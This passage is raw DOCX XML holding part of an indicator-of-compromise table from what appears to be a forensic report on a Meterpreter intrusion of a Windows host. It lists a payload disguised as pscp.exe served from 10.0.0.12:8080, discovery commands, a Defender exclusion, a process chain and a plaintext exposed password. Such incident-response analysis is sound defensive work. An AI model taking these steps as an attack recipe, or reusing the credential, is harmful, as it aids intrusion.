              <w:t>2023-11-10 11:10:55.603703</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18650</w:t>
              <w:br/>
              <w:t>mftecmd_mft/mft.csv#115203</w:t>
              <w:br/>
              <w:t>mftecmd_mft/mft.csv#109630</w:t>
              <w:br/>
              <w:t>mftecmd_mft/mft.csv#119927</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-007</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>file</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Payloads\test.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Copy of pscp.exe downloaded from http://10.0.0.12:8080/pscp.exe (986,624 B), created 2023-11-10 10:21:41 UTC; not executed per available artifacts.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:21:41.003421</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:36:48.063750</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#109630</w:t>
              <w:br/>
              <w:t>dissect/powershell_history.jsonl#5</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-008</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>file</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Users\medmondson\1.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Downloaded via Meterpreter chain powershell PID 736 from http://10.0.0.12:8080/1.exe at 2023-11-10 11:10:55 UTC (986,624 B); no execution evidence.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:10:55.494829</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:10:55.603703</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#119927</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#8814</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-009</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>command</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>netstat -ntb / whoami /user / net user administrator (parent cmd.exe GUID {e6e9f951-0f52-654e-ad01-000000000500})</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Discovery commands issued through Meterpreter shell from injected explorer.exe PID 7324, 11:12–11:13 UTC.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:12:23.447885</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:35.772808</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18688</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#18694</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#18695</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-010</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>command</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>IMPHASH=ADD361A4F3939AF38D11873F1D74BDED (C:\Payloads\pscp.exe)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Import hash of the Meterpreter payload masquerading as PuTTY PSCP 0.79 (Sysmon 1, 2023-11-10 11:03:09 UTC).</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:09.902865</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:09.902865</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18650</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-011</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>user</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>DESKTOP-KJ81A5A\medmondson (S-1-5-21-1841083384-974204330-411256071-1001), LogonId 0x15347</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Legitimate admin account whose elevated session (LogonId 0x15347, logon 2023-11-10 10:42:10) hosted the Meterpreter chain; credentials potentially exposed (lsass remote thread 11:03:56). Reset password.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:42:10.277482</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:09.902865</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#26783</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#18650</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-012</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>command</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>10.0.0.12:8080/tcp</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Attacker staging/C2 endpoint. Sysmon 3 from powershell PID 736 (child of the injected explorer chain) at 2023-11-10 11:10:55 UTC, source 10.0.0.124:50009. Same host:port served pscp.exe and 1.exe.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:10:56.791298</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:10:56.791298</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18681</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-013</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>file</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$Recycle.Bin\S-1-5-21-1841083384-974204330-411256071-1001\$RHOVDEL.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Recycled copy of the Meterpreter payload (orig. C:\Users\medmondson\Downloads\pscp.exe, 986624 B, deleted 10:20:20 UTC, Zone.Identifier HostUrl http://10.0.0.12:8080/pscp.exe). To recover and hash.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:53.835711</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:20:20</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#115196</w:t>
              <w:br/>
              <w:t>rbcmd/recyclebin_0.csv#1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-014</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>file</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Users\medmondson\Desktop\not_my_pass.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Plaintext credentials (medmondson / password123!@#) created 11:13:56 UTC during the compromise; treat password as exposed.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:56.556811</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:56.556811</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#112639</w:t>
              <w:br/>
              <w:t>sidr/DESKTOP-KJ81A5A_File_Report_20261019_151100.037119200.csv#1215</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-015</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>url</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>http://10.0.0.12:8080/</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Attacker HTTP server index (ReferrerUrl in Zone.Identifier of pscp.exe); visited in Edge at 10:16:36 UTC</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:36.111277</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:53.851269</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect/browser.history.jsonl#69</w:t>
              <w:br/>
              <w:t>mftecmd_mft/mft.csv#115204</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-016</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>registry</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\Payloads\</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Defender path exclusion created 2023-11-10 10:19:24 UTC (5007), still present at collection; the Meterpreter payload pscp.exe executed from this folder.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:24.979452</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:52:49.247111</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_C.csv#1456</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#23724</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-017</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>command</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ProcessGuid {e6e9f951-0ded-654e-8f01-000000000500} (pscp.exe PID 2196) -&gt; {e6e9f951-0ded-654e-9001-000000000500} (explorer.exe PID 7324, migrated) -&gt; cmd.exe {e6e9f951-0e2d-654e-9101-000000000500} PID 6600 / {e6e9f951-0f52-654e-ad01-000000000500} PID 5848 -&gt; powershell 736 {e6e9f951-0f56-654e-af01-000000000500}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Sysmon process chain of the Meterpreter implant (hunt key in Sysmon data of other hosts is not transferable, but identifies the chain on this host).</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:09.902865</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:10:55.607209</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18650</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#18651</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#18655</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#18676</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#18680</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>I-018</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>file</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\Prefetch\PSCP.EXE-1DCA12FC.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2381"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch of the malicious pscp.exe (run count 1, last run 2023-11-10 11:03:09.900 UTC).</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:09.900579</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:09.900579</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#98</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="680"/>
          </w:tcPr>
          <w:p>
